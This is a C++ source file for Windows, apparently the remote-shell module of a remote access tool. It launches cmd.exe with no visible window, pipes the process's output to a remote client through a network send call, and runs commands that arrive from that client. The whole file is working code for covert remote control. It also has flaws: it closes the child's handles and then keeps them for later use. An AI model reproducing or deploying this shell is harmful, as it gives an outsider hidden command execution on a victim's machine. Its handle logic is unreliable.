//
// Created by Berlingot on 2023-04-17.
////reference https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx
#include "CommandPrompt.h"



CommandPrompt::CommandPrompt(std::string path)
{
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0);
    SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0);
    CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0);
    SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0);
    createChildProcess(path);

    cmdptr = this;
}


CommandPrompt* CommandPrompt::cmdptr = NULL;
bool CommandPrompt::cmdOpen = false;
HANDLE CommandPrompt::g_hChildProcess = NULL;
HANDLE CommandPrompt::g_hChildThread = NULL;

void CommandPrompt::cmdThread(void* pvPath)
{
    char* path = (char*)pvPath;
    CommandPrompt cmd(path);
    cmdOpen = true;
    while (cmdOpen)
    {
        Sleep(100);
        Client::clientptr->SendString(cmd.readCMD(), PacketType::CMDCommand);
    }
}

std::string CommandPrompt::readCMD()	//read string from stdOut of cmd.exe	//IMPLEMENT AS THREAD
{
    if (cmdOpen)
    {
        DWORD bytesAvailable = 0;
        DWORD bytesRead = 0;
        int intBytesAvailable = 0;
        char buffer[128] = "";
        std::string output;

        do		//loop until bytes are available (until response is processed)
        {
            PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL);
            Sleep(50);
        } while (bytesAvailable <= 0);
        /*
        if (bytesAvailable >= 2048)
            bytesAvailable = 2048;
            */
        intBytesAvailable = bytesAvailable;
        while (intBytesAvailable > 0)		//while there is something to read, read it into buffer and append buffer to string
        {
            ReadFile(g_hChildStd_OUT_Rd, buffer, 127, &bytesRead, NULL);
            buffer[127] = '\0';	//NULL terminator of string
            output += buffer;
            intBytesAvailable -= bytesRead;
            if (intBytesAvailable <= 0)
                intBytesAvailable = 0;
            ZeroMemory(buffer, 128);					//clears buffer (else memory leak)
        }
        return output;
    }
    else
        return "CMD is not open";
}

void CommandPrompt::writeCMD(std::string command)		//write a string to stdIn of cmd.exe
{
    if (cmdOpen)
    {
        DWORD dwWritten = 0;    // Support low version Windows
        command += '\n';	//append '\n' to simulate "ENTER"
        if (!WriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(), &dwWritten, NULL))
            Client::clientptr->SendString("Couldn't write command '" + command + "' to stdIn.", PacketType::Warning);
    }
    else
        Client::clientptr->SendString("Couldn't write to CMD: CMD not open", PacketType::Warning);
}

void CommandPrompt::createChildProcess(std::string path)	//creates child process ||copied from https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx ||
{
    PROCESS_INFORMATION piProcInfo;
    STARTUPINFO siStartInfo;
    BOOL bSuccess = FALSE;

    // Set up members of the PROCESS_INFORMATION structure.

    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

    // Set up members of the STARTUPINFO structure.
    // This structure specifies the STDIN and STDOUT handles for redirection.

    ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
    siStartInfo.cb = sizeof(STARTUPINFO);
    siStartInfo.hStdError = g_hChildStd_OUT_Wr;
    siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
    siStartInfo.hStdInput = g_hChildStd_IN_Rd;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process.
    bSuccess = CreateProcess(path.c_str(),
                             NULL,     // command line
                             NULL,          // process security attributes
                             NULL,          // primary thread security attributes
                             TRUE,          // handles are inherited
                             CREATE_NO_WINDOW,             // creation flags
                             NULL,          // use parent's environment
                             NULL,          // use parent's current directory
                             &siStartInfo,  // STARTUPINFO pointer
                             &piProcInfo);  // receives PROCESS_INFORMATION

    // If an error occurs, exit the application.

        // Close handles to the child process and its primary thread.
        // Some applications might keep these handles to monitor the status
        // of the child process, for example.
        CloseHandle(piProcInfo.hProcess);
        CloseHandle(piProcInfo.hThread);

    g_hChildProcess = piProcInfo.hProcess;
    g_hChildThread = piProcInfo.hThread;
}